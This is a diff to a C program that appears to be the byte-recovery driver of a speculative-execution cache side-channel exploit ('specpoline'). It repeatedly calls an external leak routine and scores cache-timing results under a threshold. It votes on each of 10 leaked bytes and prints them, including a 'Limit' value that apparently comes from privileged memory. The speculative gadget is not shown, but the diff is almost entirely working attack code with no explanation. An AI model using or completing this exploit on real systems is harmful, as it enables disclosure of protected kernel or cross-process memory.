@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <limits.h>
+#include <string.h>
 
 #if CHAR_BIT != 8
     #error CHAR_BIT MUST BE 8
@@ -9,21 +10,43 @@
 extern unsigned int timings[256];
 extern void leak(unsigned int off);
 
-unsigned int find_val()
+void find_vals(unsigned int scores[256])
 {
-    unsigned int val = 0x100, i;
+    unsigned int i;
 
     for (i = 0; i < 256; i++)
     {
-        if (timings[i] >= 100)
+        if (timings[i] >= 110)
             continue;
-        if (val != 0x100)
-            return 0x100;
+        
+        //printf("Incrementing %x (act. %d)\n", i, scores[i]);
+        scores[i]++;
+    }
+}
 
-        val = i;
+unsigned int find_max(unsigned int scores[256])
+{
+    unsigned int i;
+    unsigned int max = 0, duplicated = 0;
+    unsigned int val = 0x100;
+
+    for (i = 0; i < 256; i++)
+    {
+        if (scores[i] == max)
+        {
+            duplicated = 1;
+            val = i;
+        }
+
+        if (scores[i] > max)
+        {
+            duplicated = 0;
+            max = scores[i];
+            val = i;
+        }
     }
 
-    return val;
+    return duplicated ? 0x100 : val;
 }
 
 void print_byte(unsigned int x)
@@ -34,42 +57,42 @@ void print_byte(unsigned int x)
         printf("%02x", x);
 }
 
+unsigned int scores[256] = {0};
+
 int main()
 {
     int i = 0;
     unsigned int off=0;
     int bytes[10];
 
-    int last_val, confirmed, cur_val;
+    
+    /*leak(0);
+    leak(1);
+    for (int j = 0; j < 256; j++) { if (j % 16 == 0) printf("\n"); printf("  %3d", timings[j]); }
+    printf("\n\n");
+    find_vals(scores);
+    for (int j = 0; j < 256; j++) { if (j % 16 == 0) printf("\n"); printf("  %3d", scores[j]); }
+    return 1;
+*/
 
     for (; off < 10; off++)
     {
+        memset(scores, 0, sizeof(scores));
         i = 0;
-        confirmed = 0;
-        last_val = 0x100;
-
         /* Test specpoline */
-        while (i++ < 10000)
+        while (i++ < 1000)
         {    
           leak(off);
-          cur_val = find_val();
-
-          if (last_val == 0x100 || (cur_val != 0x100 && last_val == cur_val))
-          {
-              confirmed++;
-              last_val = cur_val;
-          }
-          else
-          {
-              confirmed = 0;
-              last_val = 0x100;
-          }
-
-          if (confirmed > 5)
-              break;
+          find_vals(scores);
         }
 
-        bytes[off] = last_val;
+        //for (int j = 0; j < 256; j++) printf("  %d", scores[j]);
+        
+
+        bytes[off] = find_max(scores);
+
+        //printf("Voted for %x\n", bytes[off]);
+        //scanf("%*c");
     }
 
 
@@ -84,7 +107,7 @@ int main()
       print_byte(bytes[4]);
       print_byte(bytes[3]);
       print_byte(bytes[2]);
-    printf("Limit: ");
+    printf("\nLimit: ");
       print_byte(bytes[1]);
       print_byte(bytes[0]);
     
